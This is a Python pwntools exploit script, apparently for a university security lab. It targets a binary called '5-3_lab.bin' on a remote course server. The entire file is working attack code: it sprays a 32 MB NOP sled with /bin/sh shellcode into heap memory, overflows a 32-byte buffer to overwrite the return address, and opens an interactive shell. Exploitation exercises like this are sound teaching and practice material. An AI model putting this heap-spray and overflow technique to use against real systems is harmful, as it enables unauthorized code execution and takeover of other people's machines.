''' Script Module Importing '''
from pwn import *

context.binary = './5-3_lab.bin'                # Set Exploit Architecture

''' Constant Initializing '''
SHELLCODE = asm(shellcraft.i386.linux.sh())     # Generate Shellcode
SLED_LENGTH = 33554432                          # Set NOP sled size to 32mb
TARGET_RET = 0xf6000000                         # Set Target Return Address

''' Establish Connection '''
# Select Option based on Needs:

# --- Option 1)  Test Script Against Server --- #
p = remote("csc748.hostbin.org", 7053)

# -- Option 2) Debug Script Locally with GDB -- #
# p = process("./5-3_lab.bin")                  # Test Script Locally
# gdb.attach(p)                                 # Attach GDB to the running process


''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 1:  Allocate Heap Memory '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

#
# Craft NOP Payload
#
nop_sled = asm(shellcraft.nop() * SLED_LENGTH)  # Generate NOP sled of SLED_LENGTH
nop_payload = nop_sled + SHELLCODE              # Craft payload by combining NOP sled and shellcode
payload_size = len(nop_payload)                 # Calculate payload size in bytes

#
# Deliver NOP Payload
#
prog_prompt = p.readuntil(b'exit\n')                    # Read in Options Menu
print("\n", prog_prompt.decode('utf-8'), "\n")          # Display Options Menu

prog_prompt = p.readuntil(b'Choice:')                   # Read in Program Prompt
print(f"[*] Selecting Option (1): Load Data\n")         # Display Exploit Progress

p.sendline(b"1")                                # Select Option (1): Load Data


prog_prompt = p.readuntil(b'Length:')                   # Read in Program Prompt
print(f"[*] Sending Payload Size: {payload_size}\n")    # Display Exploit Progress
p.sendline(str(payload_size).encode())                  # Enter Data: payload size (bytes)

prog_prompt = p.readuntil(b'Data:')                     # Read in Program Prompt
print(f"[*] Sending NOP Payload\n")                     # Display Exploit Progress
p.sendline(nop_payload)         			            # Enter Data: Send NOP Payload



''' ' ' ' ' ' ' ' ' '''
''' Step 2: Exploit '''
''' ' ' ' ' ' ' ' ' '''

#
# Redirect Return Address to NOP Sled
#
prog_prompt = p.readuntil(b'exit\n')            # Read in Options Menu
prog_prompt = p.readuntil(b'Choice:')           # Read in Program Prompt

print(f"[*] Selecting Option (2): Search Data\n")       # Display Exploit Progress
p.sendline(b"2")                                        # Select Option (2): Search Data

prog_prompt = p.readuntil(b'term:')             # Read in Program Prompt
print(f"[*] Sending Redirect Payload\n")        # Display Exploit Progress

payload = b"A"*32 + p32(TARGET_RET)             # Payload Format: Buffer Fill + Estimated Return Address

#
# Send Payload
#
p.sendline(payload)             # Overwrite buffer with new address


#
# Exploit Server
#
p.interactive()                 # Start Interactive Session


